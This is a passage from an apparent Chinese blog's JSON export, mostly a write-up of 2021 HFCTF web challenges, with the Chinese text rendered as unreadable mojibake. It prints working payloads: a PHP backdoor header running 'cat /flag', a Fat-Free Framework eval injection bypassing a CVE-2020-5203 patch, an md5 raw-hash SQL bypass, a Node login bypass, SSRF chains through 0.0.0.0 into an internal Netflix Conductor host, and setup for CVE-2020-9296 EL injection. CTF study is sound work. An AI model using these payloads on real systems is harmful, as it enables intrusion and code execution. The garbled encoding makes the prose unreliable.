ã€‚ ä½ ç”šè‡³å¯ä»¥ä½¿ç”¨ç™½æ¿ï¼Œå…¶å­¦ä¹ éš¾åº¦è¾ƒä½ï¼Œä½†ä»¥å¨èƒå»ºæ¨¡ä¸“ä¸šçŸ¥è¯†ä¸ºä½¿ç”¨å‰æï¼Œå¹¶ä¸”éš¾ä»¥ä¿å­˜ã€‚ äº†è§£è¯¦ç»†ä¿¡æ¯Threat Modeling Toolhttps://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool Visiohttps://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software å®Œç»“æ’’èŠ±~ ~","categories":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/categories/SDL/"},{"name":"å¨èƒå»ºæ¨¡","slug":"SDL/å¨èƒå»ºæ¨¡","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}],"tags":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"å¨èƒå»ºæ¨¡","slug":"å¨èƒå»ºæ¨¡","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}]},{"title":"2021HFCTF Web Writeup","slug":"2021hfctf","date":"2021-04-03T09:47:20.000Z","updated":"2021-05-06T09:02:00.919Z","comments":true,"path":"2021/04/03/2021hfctf/","link":"","permalink":"https://tari.moe/2021/04/03/2021hfctf/","excerpt":"","text":"internal_system æŒºæœ‰æ„æ€çš„ï¼Œå¤ç°å®Œå­¦åˆ°äº†åˆ·å¤š ï¼ˆ ç­¾åˆ°é¢˜è€ƒç‚¹ï¼šPHPä¾›åº”é“¾æ”»å‡» php è¿‘æœŸçˆ†çš„æ¼æ´ï¼Œä¸€å¼€å§‹å°±çœ‹åˆ°äº†ï¼Œ å–”ï¼Ÿä½ è¯´è¿™ä¸ªæˆ‘å¯å°±ä¸å›°äº†ï¼Œï¼ˆæˆ‘æ˜¯ä¸ªçˆ±çœ‹æ–°é—»çš„å¥½å­©å­ é€ƒ ä½†æ˜¯ï¼Œï¼ŒUser-Agentt çœ‹æˆäº† User-Agentï¼Œï¼Œæ²¡æˆï¼Œç„¶åè¢«å¦ä¸€ä¸ªåœ°æ–¹å¸ä½äº†çœ¼çƒï¼Œåœ¨æ guestbook.php è‰ã€‚ã€‚ ç›´åˆ°å®˜æ–¹æ”¾å‡ºæç¤ºï¼Œæˆ‘ä¸ä¿¡é‚ªåœ¨çœ‹äº†ä¸€é 1user-agentt: zerodiumsystem(&quot;cat &#x2F;flag&quot;); unsetmeè€ƒç‚¹ï¼šCVE-2020-5203 è¡¥ä¸ç»•è¿‡ æºç  123456789101112131415&lt;?php// Kickstart the framework$f3=require(&#x27;lib/base.php&#x27;);// $f3 = Base::instance();$f3-&gt;set(&#x27;DEBUG&#x27;,1);if ((float)PCRE_VERSION&lt;8.0) trigger_error(&#x27;PCRE version is out of date&#x27;);// Load configurationhighlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];unset($f3-&gt;$a);$f3-&gt;run(); ä¹Ÿæ˜¯æœ‰æ•…äº‹ å¼€å¼€å¿ƒå¿ƒæœ¬åœ°åˆ†æäº†ä¸€æ³¢å¼„å‡ºæ¥äº†ï¼Œçº¿ä¸Šä¸€æ‰“ï¼Œå•¥è¿”å›éƒ½æ²¡= =ï¼Œï¼Œæˆ‘åœ¨æƒ³.. ä½ è¿™ä¸æ˜¯è€ƒå¯Ÿ CVE-2020-5203 æ ¹æ® 3.7.2çš„ä»£ç ä¿®æ”¹è®°å½• https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829 æ¥å†™ 3.7.1 çš„expä¹ˆï¼Ÿ ä½ ä¸æ˜¯ã€‚ã€‚3.7.2 å§ï¼Ÿæ™•ï¼Œäºæ˜¯æƒ³åŠæ³•æ‰¾ï¼Œæ‰¾åˆ°äº† changlog æ¥ç¡®å®šç‰ˆæœ¬ 1lib&#x2F;CHANGELOG.md è‰ï¼Œæ…¢æ…¢åˆ†æå§ï¼Œå…¶å®æ¼æ´è§¦å‘ç‚¹æ˜¯ç±»ä¼¼çš„ ç”±ä¸Šä¸¤å›¾ï¼Œ$f3 æ˜¯ Base å®ä¾‹ï¼Œè¿™ä¸ªç±»é‡è½½äº† __unset é­”æœ¯æ–¹æ³•ï¼Œç„¶åè¿™ä¸ª $key å‚æ•°æ˜¯å¯æ§çš„ ä¹Ÿå°±æ˜¯è¯´ï¼Œè°ƒç”¨ unset($f3-&gt;$a); ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ï¼Œè·Ÿè¿› $this-&gt;offsetunset æ–¹æ³•ï¼Œè°ƒç”¨ $this-&gt;clear æ–¹æ³• ç»§ç»­è·Ÿè¿›ï¼Œ åˆšåˆšè¯´åˆ°ï¼Œè¿™ä¸ª $key å‚æ•°æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª eval é‡Œçš„ $val æ˜¯å¯æ§çš„ é—®é¢˜æ˜¯ï¼Œ3.7.2 ç‰ˆæœ¬æ‰“è¿‡è¡¥ä¸ï¼Œ $this-&gt;compile æ–¹æ³•å’Œä¹‹å‰çš„ä¸åŒï¼Œå¦‚æœç”¨ 3.7.1 ç‰ˆæœ¬çš„exp æ‰“ï¼Œæ–­ç‚¹è°ƒè¯•ï¼Œä¼šå‘ç°æœ€ç»ˆ $val æ„é€ å‡ºæ¥æ˜¯ç±»ä¼¼äº &quot;[&#39;xxx;eval_code&#39;]&quot; ï¼Œæ— è®ºæ€æ ·éƒ½ä¼šè¢«åŒ…æ‹¬åœ¨å¼•å·é‡Œçš„ã€‚ å…ˆä¼ å…¥ /?a=s å³è¾¹çº¢æ¡†æ¡†ä½çš„éƒ¨åˆ†å’ŒåŸæœ¬æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå°±æ˜¯æŠŠå†™åœ¨ä¸€èµ·çš„æå–å‡ºæ¥ï¼Œèµ‹å€¼åˆ°å˜é‡é‡Œæ–¹ä¾¿æŸ¥çœ‹å˜åŒ– ç»è¿‡ $this-&gt;compile é¢„å¤„ç†å€¼ $pre ä¸º $hive[&#39;s&#39;] ï¼Œ è¦åè¢« eval çš„éƒ¨åˆ† $pinjie ä¸º &quot;unset($this-&gt;hive[&#39;s&#39;]);&quot; ã€‚ åˆ°è¿™é‡Œæˆ‘ä»¬æ˜ç™½äº†å¤§æ¦‚çš„æ•°æ®æµï¼Œå³è®¾æ³•æ„é€  $_GET[&#39;a&#39;] ä½¿æˆ‘ä»¬çš„æ¶æ„ä»£ç å¯ä»¥è¢« eval è¿™é‡Œç»•è¿‡æœ‰ä¸¤ä¸ªç‚¹ æ•°ç»„é—­åˆ æ³¨é‡Šé—­åˆå¤šä½™éƒ¨åˆ† ç»§ç»­å°è¯•æ„é€ ä¼ å…¥ a=s[]); å¯ä»¥çœ‹åˆ° $pre éƒ¨åˆ†å·²ç»æˆåŠŸè¢«é—­åˆäº†ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œ $pinjie éƒ¨åˆ†æ‹¼æ¥ä¸æ­£å¸¸ unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]); è¿™éƒ¨åˆ†æ­£å¸¸ï¼Œä½†å¤šäº† ); è‡³äºä¸ºä»€ä¹ˆæˆ‘è¿™ä¹ˆç†Ÿç»ƒï¼Œç›´æ¥ç”¨æ•°ç»„ç»™é—­åˆäº†ï¼Œï¼Œå› ä¸ºä¸€å¼€å§‹ï¼Œï¼Œåœ¨åˆ†æ 3.7.1 æ—¶ï¼ŒæŠŠä»£ç æµï¼ŒåŒ…æ‹¬ $this-&gt;compile éƒ¨åˆ†ç»™æ•´æ˜ç™½äº†ï¼Œç„¶å 3.7.2 é‡æ„äº† $this-&gt;compile å¾ˆç±»ä¼¼ï¼Œæœ‰å…´è¶£å¯ä»¥å»çœ‹çœ‹ï¼Œå°±æ˜¯æ­£åˆ™æœ‰ç‚¹å¤šå’Œå¤æ‚ã€‚ã€‚ã€‚çœ‹çš„å¤´çš®å‘éº» å°è¯•ä¼ å…¥ a=s[]);phpinfo();// è¿™æ ·ï¼Œåæ­£åé¢å¤šäº†çš„ ); ä¼šè¢«æ³¨é‡Šæ‰ï¼ˆå¥½åƒå’Œæˆ‘æ–°å¹´å‡ºçš„ CTF æœ‰ç‚¹åƒï¼Œè¦é—­åˆåŠ æ³¨é‡Šï¼‰ï¼Œæ–­ç‚¹çœ‹çœ‹å‘— ç„¶åçº¿ä¸Šç¯å¢ƒ cat ä¸€ä¸‹å°±å¥½äº† â€œæ…¢æ…¢åšâ€ ç®¡ç†ç³»ç»Ÿæ²¡åšå‡ºæ¥ï¼Œå†™æ€è·¯ï¼Œåç»­è¡¥ä¸Š æç¤º ç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯â€SELECT * FROM users WHERE password = â€˜â€œ.md5($password,true).â€â€˜ limit 0,1â€; å…ƒè€çº§ md5($password,true) ç»•è¿‡ï¼Œä»¥å‰å®éªŒå§åˆ·è¿‡ï¼Œå¯ä»¥çœ‹ä»¥ä¸‹é“¾æ¥ https://blog.csdn.net/March97/article/details/81222922 ä½†æ˜¯ã€‚ã€‚é»‘äººé—®å·.jpg å¥½ï¼Œä½ è¯´é¢˜ç›®æè¿°é‡è¦ è¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagï¼Œåæ­£æ…¢æ…¢åšå°±å¯¹äº†ï¼Œä¸è¦æ€¥èºï¼Œé™ä¸‹å¿ƒã€‚ å®Œå…¨ä¸çŸ¥é“ ssrf çš„ç‚¹åœ¨å“ªï¼Œä¸€å…±å°±å‘ç° index.php admin.php å’Œ flag.php ä¸‰ä¸ªæ–‡ä»¶ï¼Œå¥½äº†ï¼Œæ²¡æ€è·¯äº†ã€‚ï¼ˆè¿˜æ˜¯å¤ªèœäº† emmï¼Œçœ‹æ¥åˆ«äººçš„wpï¼Œå‘ç°åŸæ¥ï¼Œï¼Œé™¤äº† ffifdyop è¿˜æœ‰å…¶ä»–çš„ï¼Œæ™•â€¦. åç­‰ buu å‡ºå¤ç° ï¼ˆ 5æœˆ6æ›´ buu ç¾¤é—®äº†ä¸‹ï¼Œè¯´ä¸ä¼šå‡ºå¤ç°ç¯å¢ƒäº†ï¼Œå‚è€ƒå…¶ä»–å¸ˆå‚…çš„é¢˜è§£å§~ https://www.zhaoj.in/read-6885.html#WEB1 internal_systemæ²¡åšå‡ºæ¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ¥è¿‘äº† admin/admin ä¸€æŠŠæ¢­ï¼Œ å¯†ç ç«Ÿç„¶æ˜¯é”™çš„ï¼Œä¸è¿‡æœ‰æç¤º è®¿é—® /source è·å–æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;) router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;route.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router æŸ¥çœ‹ login æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ 1if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) å’Œ 1req.session.admin = hash === adminHash å…¶ä¸­æˆ‘ä»¬ä¼ å…¥çš„ä¸º 1const hash = sha256(sha256(salt + username) + sha256(salt + password)) ç„¶åè§ä»£ç  13 å’Œ 15è¡Œ 123const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;)) ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½è¦æ˜¯ admin ä½†æ˜¯ï¼Œï¼Œä»–ä»¬é•¿åº¦å’Œå†…å®¹ä¸ä¸€æ · = =ï¼Œå¥½ï¼Œéå¸¸å¥½ï¼Œè¿˜å¥½ js æœ‰çš„ç‰¹æ€§å’Œ PHP æœ‰ç‚¹ç±»ä¼¼ï¼Œusername ç”¨æ•°ç»„å³å¯ç»•è¿‡ ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•è®¿é—® /flag æ¥å£ï¼Œä¸è¿‡å¿…é¡»ä¸ºå†…ç½‘ ip 123456router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;) ä»£ç é‡Œæä¾› /proxy æ¥å£å¯ä»¥ä»£ç†è®¿é—®ï¼Œç„¶åè¿™ä¸ªæ¥å£æ˜¯æœ¬æœºè®¿é—®çš„ï¼Œæ‰€ä»¥å¯ä»¥è·³è¿‡è¿™ä¸ªé™åˆ¶ ç»•è¿‡ç‚¹1 12345function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125; ä½ ä¼ å…¥çš„è¦æ˜¯ipï¼Œï¼Œä¸èƒ½æ˜¯åŸŸåï¼Œè€Œä¸”ï¼Œipå¿…é¡»æ˜¯å…¬ç½‘ipï¼Œå…¶å®è¿™ä¸ªå¥½åŠï¼Œæ•´ä¸ªå…¬ç½‘æœåŠ¡å™¨ï¼Œç„¶å å†™å…¥ä»£ç é‡å®šå‘å³å¯ è‡³äºä¸ºå•¥åœ¨è¿™é‡Œå†™ /flag æ˜¯å› ä¸ºå†…éƒ¨ä»£ç†è¯·æ±‚ä¸ä¼šè§¦å‘è¿™ä¸ªwaf æœºåˆ¶ ç»•è¿‡ç‚¹2 1234function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125; æ„é€ ä¸€ä¸‹ å³å¯å¾—åˆ°æç¤ºï¼Œ å¤§æ¦‚æ„æ€æ˜¯ä»–ä»¬åœ¨å†…ç½‘éƒ¨ç½²äº† netflix conductor æœåŠ¡å™¨ï¼Œè®©æˆ‘ä»¬ SSRF ä¸€ä¸‹ï¼Œè¿™é‡Œç†Ÿæ‚‰ docker çš„ æœæœ åŒå­¦è·Ÿæˆ‘è¯´é¢˜ç›®éƒ½æ˜¯ docker æ­å»ºçš„ï¼Œä¼šä¸ä¼šï¼Œï¼Œè¿™ä¸ª netflix æœåŠ¡ä¹Ÿæ˜¯ docker æ¥çš„å‘¢ï¼Ÿ è†œæ‹œ.jpg ï¼Œè‡³äºä¸ºä»€ä¹ˆçŸ¥é“æ˜¯ 8080 ç«¯å£ï¼Œæœä¸€ä¸‹ netflix å®˜æ–¹éƒ¨ç½²æ–‡æ¡£ï¼Œå°± 8080 å’Œ 5000 ä¸¤ä¸ªç«¯å£ã€‚ å½“ç„¶ï¼Œè¿™é‡Œè¿˜æœ‰å°å·®æ›²ï¼Œæˆ‘ä¸€å¼€å§‹æš´åŠ›ç ´è§£ï¼Œï¼Œå†…ç½‘ip å’Œ ç«¯å£ï¼Œç›´æ¥æŠŠå®ƒç»™å¼„å®•æœºäº†ã€‚ã€‚ã€‚ æºç æœ‰ç‚¹é•¿ï¼Œæå–å…³é”®éƒ¨åˆ† 1234567891011121314151617window.swaggerUi = new SwaggerUi(&#123; url: url + &quot;/api/swagger.json&quot;, dom_id: &quot;swagger-ui-container&quot;, supportedSubmitMethods: [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;delete&#x27;, &#x27;patch&#x27;], onComplete: function(swaggerApi, swaggerUi)&#123; window.swaggerUi.api.setBasePath(&quot;/api&quot;); if(typeof initOAuth == &quot;function&quot;) &#123; initOAuth(&#123; clientId: &quot;your-client-id&quot;, clientSecret: &quot;your-client-secret-if-required&quot;, realm: &quot;your-realms&quot;, appName: &quot;your-app-name&quot;, scopeSeparator: &quot; &quot;, additionalQueryStringParams: &#123;&#125; &#125;); &#125; è®¿é—®è¿™ä¸ª json æ–‡ä»¶ ç„¶ååˆ°è¿™å°±å¡ä½äº† ç½‘ä¸Šæœäº†ä¸€ä¸‹ CVEï¼Œ https://xz.aliyun.com/t/7889 æ¯•ç«Ÿ SSRF å¸¸è§éƒ½æ˜¯å’Œ Redis ä¹‹ç±»çš„çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯å…¬å¼€æ¼æ´ï¼Œç„¶åæ¥å£å¥½åƒä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—® æ­£æ‰“ç®—çœ‹çœ‹èƒ½ä¸èƒ½ CRLF å•¥çš„ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘é€ POST è¯·æ±‚è¿‡å»åˆ©ç”¨ CVEï¼Œä½†çªç„¶å°±è®¿é—®ä¸äº†äº†ï¼Œï¼Œï¼Œ ä¸çŸ¥é“æ€è·¯æ˜¯ä¸æ˜¯è·‘åäº†ï¼Œç„¶åè¢«ä¸¾åŠæ–¹ç»™çœ‹åˆ°äº† ï¼Œå°±ç›´æ¥å¡äº†ï¼Œç„¶åå°±æ²¡å•¥æ—¶é—´äº†ï¼Œä¹Ÿæ²¡æ¥å¾—åŠè¯•å…¶ä»–çš„ï¼Œåç­‰ wpï¼Œæˆ‘å¾ˆå¥½å¥‡.jpg 4æœˆ22æ—¥æ›´ å¥½äº†ï¼ŒåŸæ¥æ€è·¯æ²¡æœ‰è·‘åï¼Œæˆ‘ä»¬ç»§ç»­ï¼ˆåˆšè‚å®Œè®ºæ–‡ ä¸è¿‡åœ¨ buu çš„å¤ç°ç¯å¢ƒé‡Œç›´æ¥ç»™å‡ºäº†netflix çš„å†…ç½‘ipï¼Œä¸ç”¨æˆ‘ä»¬çŒœdockerç½‘æ®µç„¶åçˆ†ç ´ï¼Œæˆ‘ä»¬ç›´æ¥fuzzä¸‹å›¾3ä¸ªç½‘æ®µ 8080ç«¯å£å³å¯ æœ€è¿‘åˆ·äº†ä¸€äº›SSRFé¢˜ï¼Œå‘ç°è¿˜å¯ä»¥ç”¨ 0.0.0.0 çš„æ–¹å¼å»ç»•è¿‡ IP é™åˆ¶ï¼Œè®¿é—® 0.0.0.0 é»˜è®¤æ˜¯è§£æåˆ°æœ¬æœºä¸Šçš„ï¼Œç„¶åæ°å¥½ nodejs çš„ IP.isPublic(host) å‡½æ•°ä¼šæŠŠä»–è§†ä¸ºå…¬ç½‘IPã€‚ æ³¨æ„fuzzçº¿ç¨‹ä¸èƒ½å¤ªé«˜ï¼Œä¸ç„¶æœåŠ¡å®¹æ˜“å´©ï¼Œæœ€ç»ˆå‘ç°netflixåœ¨ 10.0.219.14:8080 ç°åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰å¤šä¸ªçš„æ¼æ´ï¼Œæ‰€ä»¥å…ˆç¡®è®¤ä¸€ä¸‹ netflix çš„ç‰ˆæœ¬ï¼Œ å…ˆè¯·æ±‚ä¸€ä¸‹æ ¹è·¯å¾„å‘ç°æºç æœ‰ä¸­æš´éœ²çš„apiè·¯å¾„ 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080 è¯·æ±‚ä¸€ä¸‹ä¼šè¿”å›jsonæ ¼å¼å†…å®¹ 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json å¤åˆ¶json æ ¼å¼åŒ–ä¸€ä¸‹å‘ç° admin config å°±åœ¨ç¬¬ä¸€å¤„ï¼Œï¼Œ è¯·æ±‚ä¸€ä¸‹ 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config å‘ç° netflix ç‰ˆæœ¬ä¸º 2.26.0ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œåªå‘ç° 2.25.3 ç‰ˆæœ¬çš„æ¼æ´ çœ‹äº†ä¸€ä¸‹ commit è®°å½•ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬å·²ç»ä¿®äº†çš„ çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„å¤ç°ï¼Œå‘ç°æ€è·¯æ˜¯å¯¹äº†ï¼ŒCRLF POST åˆ©ç”¨ netflix çš„ CVE https://xz.aliyun.com/t/9423 https://www.zhaoj.in/read-6905.html ç»è¿‡è¿™æ¬¡æ¯”èµ›ï¼Œå‘ç°ï¼Œæœ‰æ—¶å€™ç‰ˆæœ¬ä¸å¯¹å°±å…ˆè¯•è¯•ä¸´è¿‘ç‰ˆæœ¬ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ­»é©¬å½“æ´»é©¬åŒ» ï¼ˆ é¦–å…ˆè¦å¤ç° CVE-2020-9296ï¼Œå…ˆä¿è¯åœ¨æœ¬åœ°èƒ½æ­£å¸¸åˆ©ç”¨ã€‚ CVE-2020-9296 å¤ç°æ¼æ´åˆ†æå…ˆæ­å»ºä¸€ä¸‹ç¯å¢ƒï¼Œå¤ç°ä¸€ä¸‹ å›åˆ°ä¸Šé¢çš„ https://xz.aliyun.com/t/7889 é“¾æ¥ Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code. æœ¬æ¬¡æ¼æ´æˆå› åœ¨äºè‡ªå®šä¹‰çº¦æŸå†²çªæ—¶çš„é”™è¯¯ä¿¡æ¯æ”¯æŒäº† Java EL è¡¨è¾¾å¼ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ConstraintValidatorContext.buildConstraintViolationWithTemplate() å‡½æ•°çš„å‚æ•°ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡æ³¨å…¥ Java EL è¡¨è¾¾å¼è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚ æºç ä»£ç ä¸‹è½½ï¼šhttps://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0 å…¨å±€æœä¸€ä¸‹ buildConstraintViolationWithTemplate( å‘ç°å¤šå¤„æœ‰ç”¨åˆ°ï¼Œå¹¶ä¸”å‚æ•°åˆ©ç”¨ String.format(0) ç”Ÿæˆçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¼å¼åŒ–è¿‡ç¨‹ä¸­å­˜åœ¨ç”¨æˆ·å¯æ§çš„å˜é‡ taskDef.getName() è‡³äºæ€ä¹ˆå‘ç°çš„ TaskTimeoutConstraint.java æ–‡ä»¶å­˜åœ¨å¯åˆ©ç”¨ç‚¹ï¼Œå¯èƒ½æ’æŸ¥èµ·æ¥å°±éœ€è¦äº›æ—¶é—´å’Œè€å¿ƒäº†ï¼Œè¿™é‡Œè·Ÿç€æ¥å…ˆã€‚ ä¸‹ä¸€æ­¥ç»§ç»­å…³æ³¨ TaskTimeoutConstraint.java åœ¨å“ªè¢«ä½¿ç”¨ï¼Œå®šä½åˆ° common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java æ–‡ä»¶ï¼Œå…¶å®ä¹Ÿæœ‰å¤šå¤„å¼•ç”¨ï¼Œã€‚æ‰¾æ¼æ´åˆ©ç”¨ç‚¹çš„å¤§ä½¬è¾›è‹¦äº†~ å¯ä»¥çœ‹åˆ° TaskTimeoutConstraint æ³¨è§£åˆ°äº† TaskDef ç±»ä¸Šï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥è¿›è¡Œçœ‹ TaskDef ç±»ä¼šåœ¨å“ªé‡Œè¢«ä½¿ç”¨ï¼Œç»§ç»­æœç´¢å…¨å±€å¼•ç”¨ï¼Œå¯ä»¥çœ‹åˆ° jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java ä¼šæŠŠè¯¥ç±»å’Œè·¯ç”± /api/metadata/taskdefs ç»‘å®šï¼Œå³æˆ‘ä»¬é€šè¿‡è¯·æ±‚è¯¥è·¯ç”±ï¼Œå³å¯è·å¾— TaskDef å¯¹è±¡ã€‚ https://netflix.github.io/conductor/labs/beginner/ å®˜æ–¹ç»™å‡ºçš„è®¿é—® API ç¨å¾®ä¿®æ”¹åå¦‚ä¸‹ 123456789101112131415curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;verify_if_idents_are_added&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; æ‰€ä»¥æ¼æ´æœ€ç»ˆçš„åˆ©ç”¨é€»è¾‘å¦‚ä¸‹ï¼š 